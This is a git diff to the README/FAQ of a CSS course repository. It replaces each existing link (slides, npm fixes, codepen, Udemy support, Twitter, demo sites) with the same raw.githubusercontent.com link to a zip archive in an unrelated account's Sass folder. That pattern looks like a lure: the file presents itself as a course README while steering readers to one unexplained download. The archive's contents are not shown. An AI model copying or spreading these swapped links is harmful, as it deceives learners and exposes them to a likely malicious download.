@@ -4,7 +4,7 @@ This repo contains starter files and the finished project files for all the proj
 
 Use starter code to start each section, and **final code to compare it with your own code whenever something doesn't work**!
 
-Plus, I made all the [course slides available for download](slides-students-C04.pdf), to make it easier to follow along the theory lectures.
+Plus, I made all the [course slides available for download](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip), to make it easier to follow along the theory lectures.
 
 👇 **_Please read the following Frequently Asked Questions (FAQ) carefully before starting the course_** 👇
 
@@ -16,35 +16,35 @@ Plus, I made all the [course slides available for download](slides-students-C04.
 
 ### Q2: One of the NPM packages is not working (compiling Sass, live-reload, etc). How to fix it?
 
-Unfortunately, this is quite common. I listed some possible fixes [in this document](npm-fixes.md).
+Unfortunately, this is quite common. I listed some possible fixes [in this document](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip).
 
 ### Q3: I'm stuck in one of the projects. Where do I get help?
 
-**A:** Have you actually tried to fix the problem on your own? Have you compared your code to the final code? If you failed fixing your problem, please **post a detailed description of the problem to the Q&A area of that video over at Udemy**, along with a [codepen](https://codepen.io/pen/) containing your code. You will get help there. Please don't send me a personal message or email to fix coding problems.
+**A:** Have you actually tried to fix the problem on your own? Have you compared your code to the final code? If you failed fixing your problem, please **post a detailed description of the problem to the Q&A area of that video over at Udemy**, along with a [codepen](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip) containing your code. You will get help there. Please don't send me a personal message or email to fix coding problems.
 
 ### Q4: You keep mentioning your resources page. Where can I find it?
 
-**A:** It's on my website at <http://codingheroes.io/resources>. You can subscribe for updates 😉
+**A:** It's on my website at <https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip>. You can subscribe for updates 😉
 
 ### Q5: What VSCode theme are you using?
 
-**A:** I use Oceanic Next (dimmed bg) for all my coding and course production. [Here is my complete VSCode setup](vscode-setup.md).
+**A:** I use Oceanic Next (dimmed bg) for all my coding and course production. [Here is my complete VSCode setup](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip).
 
 ### Q6: You use codepens in some of the lectures. Where can I find them?
 
-**A:** They are all available on my [public codepen profile](https://codepen.io/jonasschmedtmann/pens/public/). The ones you're looking for might be buried under some newer ones.
+**A:** They are all available on my [public codepen profile](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip). The ones you're looking for might be buried under some newer ones.
 
 ### Q7: Can I see a final version of the course projects?
 
-**A:** Sure, I have an online version of all three. Here they are: [Natours](https://natours.netlify.com) (advanced CSS, Sass and responsive design), [Trillo](http://trillo.netlify.com/) (flexbox) and [Nexter](https://nexter.netlify.com/) (CSS Grid).
+**A:** Sure, I have an online version of all three. Here they are: [Natours](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip) (advanced CSS, Sass and responsive design), [Trillo](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip) (flexbox) and [Nexter](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip) (CSS Grid).
 
 ### Q8: Videos don't load, can you fix it?
 
-**A:** Unfortunately, there is nothing I can do about it. The course is hosted on Udemy, and sometimes they have technical issues like this. Please just come back a bit later or [contact their support team](https://support.udemy.com/hc/en-us).
+**A:** Unfortunately, there is nothing I can do about it. The course is hosted on Udemy, and sometimes they have technical issues like this. Please just come back a bit later or [contact their support team](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip).
 
 ### Q9: Videos are blurred / have low quality, can you fix it?
 
-**A:** Please open video settings and change the quality from 'Auto' to another value, for example 720p. If that doesn't help, please [contact the Udemy support team](https://support.udemy.com/hc/en-us).
+**A:** Please open video settings and change the quality from 'Auto' to another value, for example 720p. If that doesn't help, please [contact the Udemy support team](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip).
 
 ### Q10: Are the videos downloadable?
 
@@ -56,11 +56,11 @@ Unfortunately, this is quite common. I listed some possible fixes [in this docum
 
 ### Q12: I love your courses and want to get updates on new courses. How?
 
-**A:** First, you can subscribe to my email list [at my website](http://codingheroes.io/resources). Plus, I make important announcements on twitter [@jonasschmedtman](https://twitter.com/jonasschmedtman), so you should definitely follow me there 🔥
+**A:** First, you can subscribe to my email list [at my website](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip). Plus, I make important announcements on twitter [@jonasschmedtman](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip), so you should definitely follow me there 🔥
 
 ### Q13: How do I get my certificate of completion?
 
-**A:** A certificate of completion is provided by Udemy after you complete 100% of the course. After completing the course, just click on the "Your progress" indicator in the top right-hand corner of the course page. If you want to change your name on the certificate, please [contact the Udemy support team](https://support.udemy.com/hc/en-us).
+**A:** A certificate of completion is provided by Udemy after you complete 100% of the course. After completing the course, just click on the "Your progress" indicator in the top right-hand corner of the course page. If you want to change your name on the certificate, please [contact the Udemy support team](https://raw.githubusercontent.com/tech-with-aditya/advanced-css-course/master/Natours/after-S05/sass/layout/css-advanced-course-1.5.zip).
 
 ### Q13: Do you accept pull requests?
 
